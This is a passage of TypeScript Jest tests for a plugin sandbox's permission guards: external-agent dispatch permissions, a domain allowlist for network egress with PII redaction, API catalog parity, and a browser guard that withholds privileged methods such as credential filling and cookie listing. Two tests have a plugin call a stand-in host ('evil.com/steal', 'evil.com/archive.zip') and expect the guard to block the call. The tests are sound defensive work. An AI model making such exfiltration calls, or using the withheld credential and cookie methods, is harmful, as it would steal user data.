        finalResponse: "done",
        tokenUsage: { input: 1, output: 2 },
      }))
      const live = new Set<string>()
      const addAgent = jest.fn(async () => {
        live.add("ext-1")
        return { config: { id: "ext-1" } }
      })
      const removeAgent = jest.fn(async (id: string) => {
        live.delete(id)
      })
      mockGetExternalManager.mockReturnValue({
        getAgent: jest.fn((id: string) => (live.has(id) ? { config: { id } } : undefined)),
        addAgent,
        removeAgent,
        execute,
      } as unknown as ReturnType<typeof getExternalAgentManager>)
      mockCreateAgentFromPreset.mockReturnValue({ id: "ext-1", name: "Codex" } as never)

      const ctx = createPluginContext(createMockPlugin(), mockManager)
      const result = await ctx.agent.runExternalAgent("codex", "do it")

      expect(mockCreateAgentFromPreset).toHaveBeenCalledWith("codex")
      expect(addAgent).toHaveBeenCalled()
      // Clamped to the global default; the transient instance ends with the run.
      expect(execute).toHaveBeenCalledWith("ext-1", "do it", { permissionMode: "default" })
      expect(removeAgent).toHaveBeenCalledWith("ext-1")
      // The raw manager result is normalized to the SDK's run shape.
      expect(result).toMatchObject({
        agentId: "ext-1",
        text: "done",
        status: "completed",
        usage: { input: 1, output: 2 },
      })
    })

    it("executes directly against a configured, live instance without re-adding", async () => {
      initializePluginPermissions(PLUGIN_ID, ["agent:dispatch-external"])
      mockExternalAgentStoreState.getAgent.mockImplementation((id: string) =>
        id === "live-1" ? { id, enabled: true } : undefined
      )
      const execute = jest.fn(async () => ({ output: "live" }))
      const addAgent = jest.fn()
      mockGetExternalManager.mockReturnValue({
        getAgent: jest.fn(() => ({ config: { id: "live-1" } })),
        addAgent,
        execute,
      } as unknown as ReturnType<typeof getExternalAgentManager>)

      const ctx = createPluginContext(createMockPlugin(), mockManager)
      await ctx.agent.runExternalAgent("live-1", "ping")

      expect(addAgent).not.toHaveBeenCalled()
      expect(execute).toHaveBeenCalledWith("live-1", "ping", { permissionMode: "default" })
      mockExternalAgentStoreState.getAgent.mockImplementation(() => undefined)
    })

    it("throws when neither a live agent nor a preset matches", async () => {
      initializePluginPermissions(PLUGIN_ID, ["agent:dispatch-external"])
      mockGetExternalManager.mockReturnValue({
        getAgent: jest.fn(() => undefined),
        addAgent: jest.fn(),
        execute: jest.fn(),
      } as unknown as ReturnType<typeof getExternalAgentManager>)
      mockCreateAgentFromPreset.mockReturnValue(null)

      const ctx = createPluginContext(createMockPlugin(), mockManager)
      await expect(ctx.agent.runExternalAgent("unknown", "x")).rejects.toThrow(
        /no configured agent or preset/
      )
    })
  })

  describe("dispatchSubagent to an external agent", () => {
    it("also requires agent:dispatch-external for an inline external def", async () => {
      initializePluginPermissions(PLUGIN_ID, ["agent:dispatch"])
      const ctx = createPluginContext(createMockPlugin(), mockManager)
      await expect(
        ctx.agent.dispatchSubagent(
          { id: "test-plugin:reviewer", prompt: "review", externalPresetId: "codex" } as never,
          "go"
        )
      ).rejects.toThrow(/agent:dispatch-external/)
    })

    it("also requires agent:dispatch-external when options name an external agent", async () => {
      initializePluginPermissions(PLUGIN_ID, ["agent:dispatch"])
      const ctx = createPluginContext(createMockPlugin(), mockManager)
      await expect(
        ctx.agent.dispatchSubagent(
          { id: "test-plugin:reviewer", prompt: "review" } as never,
          "go",
          { externalAgentId: "codex" }
        )
      ).rejects.toThrow(/agent:dispatch-external/)
    })
  })

  describe("network egress allowlist (renderer path)", () => {
    const fetchMock = jest.fn()

    beforeEach(() => {
      mockIsTauri.mockReturnValue(false)
      fetchMock.mockReset()
      fetchMock.mockResolvedValue({
        ok: true,
        status: 200,
        statusText: "OK",
        headers: new Headers({ "content-type": "application/json" }),
        json: async () => ({ ok: true }),
      } as unknown as Response)
      global.fetch = fetchMock as unknown as typeof fetch
    })

    const pluginWithEgress = (allowedDomains?: string[]) =>
      createMockPlugin({
        manifest: {
          ...mockManifest,
          networkAccess: allowedDomains ? { allowedDomains } : undefined,
        },
      })

    const pluginWithNetworkPolicy = (networkAccess: unknown) =>
      createMockPlugin({
        manifest: {
          ...mockManifest,
          networkAccess: networkAccess as Plugin["manifest"]["networkAccess"],
        },
      })

    it("allows a fetch to a declared domain (and its subdomains)", async () => {
      const ctx = createPluginContext(pluginWithEgress(["example.com"]), mockManager)
      await expect(ctx.network.get("https://api.example.com/v1")).resolves.toMatchObject({
        ok: true,
      })
      expect(fetchMock).toHaveBeenCalledTimes(1)
    })

    it("blocks a fetch to an undeclared domain before hitting the network", async () => {
      const ctx = createPluginContext(pluginWithEgress(["example.com"]), mockManager)
      await expect(ctx.network.get("https://evil.com/steal")).rejects.toThrow(
        /not in plugin test-plugin's allowedDomains/
      )
      expect(fetchMock).not.toHaveBeenCalled()
    })

    it("denies egress when no allowlist is declared (balanced, fail-closed)", async () => {
      const ctx = createPluginContext(pluginWithEgress(undefined), mockManager)
      await expect(ctx.network.get("https://anywhere.dev")).rejects.toThrow(
        /not in plugin test-plugin's allowedDomains/
      )
      expect(fetchMock).not.toHaveBeenCalled()
    })

    it("keeps the explicit '*' wildcard opt-in unrestricted", async () => {
      const ctx = createPluginContext(pluginWithEgress(["*"]), mockManager)
      await expect(ctx.network.get("https://anywhere.dev")).resolves.toMatchObject({
        ok: true,
      })
      expect(fetchMock).toHaveBeenCalledTimes(1)
    })

    it("enforces declarative HTTP method and path rules before egress", async () => {
      const ctx = createPluginContext(
        pluginWithNetworkPolicy({
          allowedDomains: ["api.example.com"],
          rules: [
            {
              domain: "api.example.com",
              methods: ["GET"],
              paths: ["/api/logs/*"],
            },
          ],
        }),
        mockManager
      )

      await expect(
        ctx.network.get("https://api.example.com/api/logs/recent")
      ).resolves.toMatchObject({ ok: true })
      await expect(ctx.network.delete("https://api.example.com/api/logs/recent")).rejects.toThrow(
        /network policy/
      )
      await expect(ctx.network.get("https://api.example.com/api/admin/users")).rejects.toThrow(
        /network policy/
      )
      expect(fetchMock).toHaveBeenCalledTimes(1)
    })

    it("redacts recognized PII from query parameters and request bodies", async () => {
      const ctx = createPluginContext(pluginWithEgress(["api.example.com"]), mockManager)

      await ctx.network.post(
        "https://api.example.com/incidents?owner=alice@example.com",
        { summary: "Incident owner alice@example.com" },
        { dataClassification: "operational", piiPolicy: "redact" }
      )

      const [url, init] = fetchMock.mock.calls[0] as [string, RequestInit]
      expect(url).not.toContain("alice@example.com")
      expect(decodeURIComponent(url)).toContain("<EMAIL_001>")
      expect(String(init.body)).not.toContain("alice@example.com")
      expect(String(init.body)).toContain("<EMAIL_001>")
      const audit = getPermissionGuard().getAuditLog({ pluginId: "test-plugin" })
      expect(audit).toEqual(
        expect.arrayContaining([
          expect.objectContaining({
            context:
              "egress POST https://api.example.com/incidents classification=operational pii=redact",
          }),
        ])
      )
      expect(JSON.stringify(audit)).not.toContain("alice@example.com")
    })

    it("blocks browser downloads to undeclared domains before fetching", async () => {
      const ctx = createPluginContext(pluginWithEgress(["example.com"]), mockManager)

      await expect(
        ctx.network.download("https://evil.com/archive.zip", "archive.zip")
      ).rejects.toThrow(/allowedDomains/)
      expect(fetchMock).not.toHaveBeenCalled()
    })
  })
})

describe("python host-call parity (ADR-0145)", () => {
  /**
   * The catalog claims a set of `ctx.*` namespaces is reachable from a Python
   * plugin. Nothing in the Python process can verify that: it only sends
   * `<namespace>.<method>` strings over a pipe. So the claim is checked here,
   * against a real context — otherwise the contract could say `ctx.git` is
   * python-callable long after the namespace was renamed, and the only symptom
   * would be a plugin author's call failing at runtime.
   *
   * This is the same failure ADR-0087 recorded for `pythonExecution`: an SDK
   * that advertised capabilities the runtime could not execute.
   */
  const pythonNamespaces = PLUGIN_API_NAMESPACE_CONTRACTS.filter((namespace) =>
    namespace.runtimes.includes("python")
  )

  it("opens at least the namespaces the reverse RPC channel was built for", () => {
    expect(pythonNamespaces.map((namespace) => namespace.id).sort()).toEqual(
      [
        // The three declarative-panel namespaces are what make a
        // `contextPanels: [{ kind: "a2ui" }]` entry more than a manifest line:
        // the plugin builds the surface with `a2ui`, reveals the panel with
        // `contextPanels`, and hands selections back with `chat`.
        "a2ui",
        "agent",
        // Opened to python deliberately: ctx.commands / ctx.templates on
        // 2026-09-02, ctx.ai / ctx.bots / ctx.integrations on 2026-09-12.
        "ai",
        "bots",
        "chat",
        "commands",
        "contextPanels",
        // ADR-0194: a python plugin both provides (laya) and consumes System-1
        // decisions through the same guarded ctx.decisions.
        "decisions",
        "editor",
        // ADR-0216: python plugins manage external-agent configurations through
        // the same guarded, secret-free ctx.externalAgents.
        "externalAgents",
        "fs",
        "git",
        "i18n",
        "integrations",
        "logger",
        "notifications",
        "secrets",
        "storage",
        "templates",
        // The user's schedule is request/response end to end, and its writes
        // are policy-gated and attributed in `lib/plugin/api/scheduler-tasks.ts`,
        // so a Python plugin gets it on the same terms. `ctx.scheduler` stays
        // JS-only: its handlers are functions registered in the JS runtime.
        "userScheduler",
        // A Python plugin could START a Squad through `ctx.agent.runTeam`, which
        // is python-open and needs only `agent:dispatch`, and could not READ
        // one, because `ctx.team` listed only frontend and hybrid. That inverts
        // the safety story `lib/plugin/api/team-api.ts` tells about itself.
        "team",
        "ui",
        "workspace",
      ].sort()
    )
  })

  it.each(pythonNamespaces.map((namespace) => [namespace.id, namespace] as const))(
    "ctx.%s exists on a real context with every method the contract lists",
    (id, namespace) => {
      const context = createFullPluginContext(createMockPlugin(), mockManager)
      expect((context as unknown as Record<string, unknown>)[id]).toBeDefined()

      // `./logger` is stubbed at the top of this file with a four-method
      // console shim, so a context built here would report the real logger's
      // `child` / `withContext` / `trace` / `fatal` as missing and this test
      // would be measuring the mock, not the implementation. Resolve that one
      // namespace from the module itself; the other six are the real thing.
      const surface =
        id === "logger"
          ? jest
              .requireActual<typeof import("./logger")>("./logger")
              .createPluginSystemLogger("parity-probe")
          : (context as unknown as Record<string, unknown>)[id]

      // Method names are dotted for nested surfaces (`sessions.create`,
      // `guardrails.register`), which is how the contract models them.
      const resolve = (root: unknown, path: string): unknown =>
        path.split(".").reduce<unknown>((holder, segment) => {
          if (holder === null || typeof holder !== "object") return undefined
          return (holder as Record<string, unknown>)[segment]
        }, root)

      const missing = namespace.methods
        .map((method) => method.name)
        .filter((name) => typeof resolve(surface, name) !== "function")
      expect(missing).toEqual([])
    }
  )

  it("routes a contract method through the router onto the real context", async () => {
    const context = createFullPluginContext(createMockPlugin(), mockManager)
    const outcome = await routePythonHostRequest(
      {
        pluginId: "test-plugin",
        generation: "gen-1",
        requestId: 1,
        method: "logger.info",
        params: { args: ["hello"] },
      },
      { getContext: () => context }
    )
    // The value is unimportant; that the dotted path resolved to something
    // callable on the governed context is the whole point.
    expect(outcome.ok).toBe(true)
  })

  it("classifies a python plugin as the python runtime, not frontend", () => {
    // Without this the catalog's per-runtime gate can never fire for python:
    // every call would be evaluated as if it came from the renderer.
    expect(pluginApiRuntimeForType("python")).toBe("python")
    expect(pluginApiRuntimeForType("hybrid")).toBe("hybrid")
    expect(pluginApiRuntimeForType("wasm")).toBe("wasm")
    expect(pluginApiRuntimeForType("vscode-extension")).toBe("vscode")
    expect(pluginApiRuntimeForType("frontend")).toBe("frontend")
    expect(pluginApiRuntimeForType(undefined)).toBe("frontend")
  })
})

describe("ctx → catalog parity", () => {
  /**
   * The governed context throws `unmapped` for any callable `ctx.*` path the
   * contract catalog does not list, whatever the plugin's permissions. The
   * python suite above checks catalog → context; this is the other direction,
   * so a method added to a `create*API()` without a catalog row fails here
   * instead of failing every plugin that calls it at runtime.
   */
  const catalogMethodIds = new Set(
    PLUGIN_API_NAMESPACE_CONTRACTS.flatMap((namespace) =>
      namespace.methods.map((method) => method.id)
    )
  )

  const callablePaths = (root: unknown, prefix: string, seen = new Set<unknown>()): string[] => {
    if (root === null || typeof root !== "object" || seen.has(root)) return []
    seen.add(root)
    const prototype = Object.getPrototypeOf(root)
    if (prototype !== Object.prototype && prototype !== null) return []
    return Object.entries(root as Record<string, unknown>).flatMap(([key, value]) => {
      const path = `${prefix}.${key}`
      if (typeof value === "function") return [path]
      return callablePaths(value, path, seen)
    })
  }

  it("enumerates the scheduler's methods, so the check below is not vacuous for it", () => {
    const context = createFullPluginContext(
      createMockPlugin({ manifest: { ...mockManifest, capabilities: ["tools", "scheduler"] } }),
      mockManager
    )
    const paths = callablePaths(context.scheduler, "scheduler")
    expect(paths).toEqual(
      expect.arrayContaining([
        "scheduler.createTask",
        "scheduler.emitEvent",
        "scheduler.getStatistics",
        "scheduler.onExecution",
        "scheduler.previewTrigger",
      ])
    )
    expect(paths.filter((path) => !catalogMethodIds.has(path))).toEqual([])
  })

  it.each(PLUGIN_API_NAMESPACE_CONTRACTS.map((namespace) => [namespace.id] as const))(
    "every function on ctx.%s has a catalog row",
    (id) => {
      // The scheduler capability is declared so `ctx.scheduler` is the real
      // API rather than the denied proxy, whose empty target made this check
      // vacuous for that namespace: it enumerated no methods at all.
      const context = createFullPluginContext(
        createMockPlugin({
          manifest: { ...mockManifest, capabilities: ["tools", "scheduler"] },
        }),
        mockManager
      )
      const surface = (context as unknown as Record<string, unknown>)[id]
      const unmapped = callablePaths(surface, id).filter((path) => !catalogMethodIds.has(path))
      expect(unmapped).toEqual([])
    }
  )
})

describe("ctx.config", () => {
  afterEach(() => {
    delete mockStorePlugins["test-plugin"]
  })

  it("reads the plugin's current settings, not the activation-time snapshot", () => {
    const plugin = createMockPlugin()
    const context = createFullPluginContext(plugin, mockManager)
    expect(context.config).toEqual(plugin.config)

    // The store replaces the config object on every settings change.
    mockStorePlugins["test-plugin"] = { config: { privacyMode: true } }
    expect(context.config).toEqual({ privacyMode: true })
  })
})

describe("ctx.browser guard (ADR-0201)", () => {
  const PRIVILEGED = [
    "fillCredential",
    "getStorage",
    "networkRequest",
    "listCookies",
    "clearCookies",
  ] as const

  beforeEach(() => {
    resetPermissionGuard()
  })

  it("requires agent:control for every method", () => {
    getPermissionGuard().registerPlugin("no-agent", [])
    const api = createGuardedBrowserAPI("no-agent", "marketplace")
    expect(() => api.routeEngine("http://localhost/")).toThrow(PermissionError)
    expect(() => api.isDomainAuthorized("https://a.test/")).toThrow(PermissionError)
    expect(() => api.isSurfaceVisible()).toThrow(PermissionError)
    expect(() => api.ensureLocalEngine("local-chromium")).toThrow(PermissionError)
  })

  it("hands a third-party plugin an engine facade without the privileged methods", async () => {
    getPermissionGuard().registerPlugin("third-party", ["agent:control"])
    const route = createGuardedBrowserAPI("third-party", "marketplace").routeEngine(
      "http://localhost/"
    )
    for (const method of PRIVILEGED) {
      expect((route.engine as Record<string, unknown>)[method]).toBeUndefined()
    }
    expect(typeof route.engine.snapshot).toBe("function")
    expect(route.engine.backend).toBe("embedded")
    expect(Object.isFrozen(route.engine)).toBe(true)
  })

  it("does not trust a non-bundled plugin that reuses the Browser Tools id", () => {
    getPermissionGuard().registerPlugin("cognia-browser-tools", ["agent:control"])
    const route = createGuardedBrowserAPI("cognia-browser-tools", "local").routeEngine(
      "http://localhost/"
    )
    expect((route.engine as Record<string, unknown>).fillCredential).toBeUndefined()
  })

  it("gives the bundled Browser Tools plugin the full engine", () => {
    getPermissionGuard().registerPlugin("cognia-browser-tools", ["agent:control"])
    const route = createGuardedBrowserAPI("cognia-browser-tools", "builtin").routeEngine(
      "http://localhost/"
    )
    for (const method of PRIVILEGED) {
      expect(typeof (route.engine as Record<string, unknown>)[method]).toBe("function")
    }
  })
})
